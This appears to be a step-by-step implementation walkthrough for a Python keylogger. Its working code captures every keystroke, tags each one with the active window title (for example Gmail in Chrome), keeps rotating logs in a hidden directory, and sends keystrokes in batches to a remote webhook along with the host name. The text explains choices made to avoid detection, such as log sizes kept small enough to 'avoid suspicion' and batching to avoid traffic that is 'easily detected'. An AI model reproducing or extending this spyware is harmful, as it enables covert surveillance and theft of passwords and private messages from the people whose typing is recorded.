# Implementation Walkthrough — Keylogger

This document walks through the actual code. We'll build key features step by step and explain the decisions along the way.

---

## File Structure

```
keylogger.py
├── Imports (1-50)              # Dependencies and platform detection
├── Module-level constants      # BYTES_PER_MB, timeouts, SPECIAL_KEYS dict
├── KeyType enum                # CHAR, SPECIAL, UNKNOWN classification
├── KeyloggerConfig dataclass   # Pure data container, no side effects
├── KeyEvent dataclass          # Keystroke record with serialization
├── WindowTracker class         # Platform-specific window detection
├── LogManager class            # Direct file I/O with rotation
├── WebhookDelivery class       # Remote exfiltration (buffer swap)
└── Keylogger class             # Main controller
```

---

## Step 1: Key Classification with Enums

```python
class KeyType(Enum):
    """
    Categorizes keystrokes as character, special, or unknown
    """
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()
```

**Why this code works:**
- `Enum` provides type safety at runtime
- `auto()` generates unique integer values automatically
- CHAR represents printable characters (a-z, 0-9, symbols)
- SPECIAL represents control keys (Enter, Tab, arrows, modifiers)
- UNKNOWN handles edge cases where key classification fails

---

## Step 2: Configuring Behavior with Dataclasses

```python
@dataclass
class KeyloggerConfig:
    log_dir: Path = None
    log_file_prefix: str = "keylog"
    max_log_size_mb: float = 5.0
    webhook_url: str = None
    webhook_batch_size: int = 50
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True
    window_check_interval: float = WINDOW_CHECK_INTERVAL_SECS

    def __post_init__(self):
        if self.log_dir is None:
            self.log_dir = Path.home() / ".keylogger_logs"
```

**What's happening:**
1. `@dataclass` decorator generates `__init__`, `__repr__`, and equality methods automatically
2. Type hints document expected types and enable static analysis
3. Default values let you customize only what you need
4. KeyloggerConfig is a pure data container — directory creation happens in LogManager, not here

---

## Step 3: The KeyEvent Data Model

```python
@dataclass
class KeyEvent:
    timestamp: datetime
    key: str
    window_title: str = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict:
        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": self.window_title or "Unknown",
            "key_type": self.key_type.name.lower(),
        }

    def to_log_string(self) -> str:
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window = f" [{self.window_title}]" if self.window_title else ""
        return f"[{time_str}]{window} {self.key}"
```

**Two serialization formats:**
- `to_dict()` → JSON-serializable format for webhook delivery
- `to_log_string()` → Human-readable format for log files

Example log output:
```
[2026-01-31 14:30:22][Chrome - Gmail] p
[2026-01-31 14:30:22][Chrome - Gmail] a
[2026-01-31 14:30:23][Chrome - Gmail] [ENTER]
```

---

## Step 4: Cross-Platform Window Tracking

```python
class WindowTracker:
    @staticmethod
    def get_active_window():
        system = platform.system()

        if system == WINDOWS and win32gui:
            return WindowTracker._get_windows_window()
        if system == DARWIN and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == LINUX:
            return WindowTracker._get_linux_window()

        return None
```

This public method hides platform complexity. Callers just invoke `get_active_window()` and get back a string or None regardless of OS.

**Windows implementation:**
```python
hwnd = win32gui.GetForegroundWindow()
_, pid = win32process.GetWindowThreadProcessId(hwnd)
process = psutil.Process(pid)
title = win32gui.GetWindowText(hwnd)
return f"{process.name()} - {title}"
```

**Linux implementation:**
```python
result = subprocess.run(
    ['xdotool', 'getactivewindow', 'getwindowname'],
    capture_output=True, text=True, timeout=1, check=False,
)
if result.returncode == 0:
    return result.stdout.strip()
```

---

## Step 5: Thread-Safe File Writing with Rotation

```python
class LogManager:
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        config.log_dir.mkdir(parents=True, exist_ok=True)
        self.current_log_path = self._get_new_log_path()
        self._lock = Lock()
        self._file = open(self.current_log_path, 'a', encoding='utf-8')

    def write_event(self, event: KeyEvent) -> None:
        with self._lock:
            self._file.write(event.to_log_string() + '\n')
            self._file.flush()
            self._check_rotation()
```

**Key points:**
- `Lock()` prevents race conditions when multiple threads write simultaneously
- `with self._lock:` guarantees the lock is released even if an exception occurs
- `self._file.flush()` ensures data is written to disk immediately

**Rotation logic:**
```python
def _check_rotation(self) -> None:
    try:
        size = self.current_log_path.stat().st_size
    except FileNotFoundError:
        self._rotate()  # File was deleted externally, recover
        return

    if size / BYTES_PER_MB >= self.config.max_log_size_mb:
        self._rotate()

def _rotate(self) -> None:
    self._file.close()
    self.current_log_path = self._get_new_log_path()
    self._file = open(self.current_log_path, 'a', encoding='utf-8')
```

Why 5MB default? Large enough to capture significant activity (weeks/months of typing). Small enough to avoid suspicion.

---

## Step 6: Batched Webhook Delivery (Buffer Swap Pattern)

```python
def add_event(self, event: KeyEvent) -> None:
    if not self.enabled:
        return

    batch = None
    with self.buffer_lock:
        self.event_buffer.append(event)
        if len(self.event_buffer) >= self.config.webhook_batch_size:
            batch = self.event_buffer   # Grab the full buffer
            self.event_buffer = []      # Swap to empty list

    if batch:
        self._deliver_batch(batch)  # Deliver OUTSIDE the lock
```

**Buffer swap pattern:** When the batch is full, we swap `self.event_buffer` with a fresh empty list inside the lock, then deliver outside the lock. This means the HTTP POST (which is slow) never blocks other threads from adding events.

```python
def _deliver_batch(self, events: list) -> None:
    payload = {
        "timestamp": datetime.now().isoformat(),
        "host": platform.node(),
        "events": [e.to_dict() for e in events],
    }

    try:
        response = requests.post(
            self.config.webhook_url,
            json=payload,
            timeout=WEBHOOK_TIMEOUT_SECS,
        )
        if not response.ok:
            logging.warning("Webhook returned %s", response.status_code)
    except Exception:
        logging.error("Webhook delivery failed", exc_info=True)
```

---

## Step 7: The Main Event Handler

```python
def _on_press(self, key) -> None:
    # 1. Check toggle key first
    if key == self.config.toggle_key:
        self._toggle_logging()
        return

    # 2. Check if logging is active
    if not self.is_logging.is_set():
        return

    # 3. Update active window (cached)
    self._update_active_window()

    # 4. Convert key to string
    key_str, key_type = self._process_key(key)

    # 5. Filter special keys if configured to skip them
    if key_type == KeyType.SPECIAL and not self.config.log_special_keys:
        return

    # 6. Create KeyEvent
    event = KeyEvent(
        timestamp=datetime.now(),
        key=key_str,
        window_title=self._current_window,
        key_type=key_type,
    )

    # 7. Store locally and send to webhook
    self.log_manager.write_event(event)
    self.webhook.add_event(event)
```

---

## Step 8: Key Processing

```python
def _process_key(self, key):
    if isinstance(key, Key):           # Special key (Enter, Shift, etc.)
        label = SPECIAL_KEYS.get(key)
        if label:
            return label, KeyType.SPECIAL
        return f"[{key.name.upper()}]", KeyType.SPECIAL

    if hasattr(key, 'char') and key.char:  # Character key (a, 1, !, etc.)
        return key.char, KeyType.CHAR

    return "[UNKNOWN]", KeyType.UNKNOWN
```

pynput gives us two types:
- `Key` for special keys (Enter, Shift, arrows)
- `KeyCode` for character keys (a, 1, !)

---

## Step 9: Lifecycle Management

```python
def start(self) -> None:
    self.is_running.set()
    self.is_logging.set()

    self.listener = keyboard.Listener(on_press=self._on_press)
    self.listener.start()

    try:
        while self.is_running.is_set():
            self.listener.join(timeout=LISTENER_JOIN_TIMEOUT_SECS)
    except KeyboardInterrupt:
        self.stop()

def stop(self) -> None:
    self.is_running.clear()
    self.is_logging.clear()

    if self.listener:
        self.listener.stop()

    self.webhook.flush()       # Send remaining buffered events
    self.log_manager.close()   # Release file handle
```

**Important:** On shutdown, `webhook.flush()` sends remaining buffered events and `log_manager.close()` releases the file handle cleanly.

---

## Tracing a Complete Request

**Scenario:** User types "p" while focused on Gmail in Chrome

1. `key` is `KeyCode(char='p')`, `is_logging` is set
2. `_update_active_window()` returns cached "chrome.exe - Gmail"
3. `_process_key(KeyCode(char='p'))` → `("p", KeyType.CHAR)`
4. `KeyEvent` created with timestamp, key="p", window="chrome.exe - Gmail"
5. `LogManager.write_event()` → writes `[2026-01-31 14:30:45][chrome.exe - Gmail] p`
6. `WebhookDelivery.add_event()` → buffer now has 47 events, not yet at batch size 50

---

## Common Mistakes to Avoid

**Not using locks:**
```python
# BAD: Two threads can corrupt the file
def write_event(self, event):
    self._file.write(event.to_log_string() + '\n')
```

**Sending every keystroke immediately:**
```python
# BAD: Creates massive network traffic, easily detected
def _on_press(self, key):
    requests.post(webhook_url, json={"key": str(key)})
```

**Ignoring import failures:**
```python
# BAD: Silent failure hides problems
try:
    import win32gui
except:
    pass
```

**The correct approach — setting to None for optional imports:**
```python
# GOOD: Explicit sentinel value, checked before use
try:
    import win32gui
except ImportError:
    win32gui = None
```
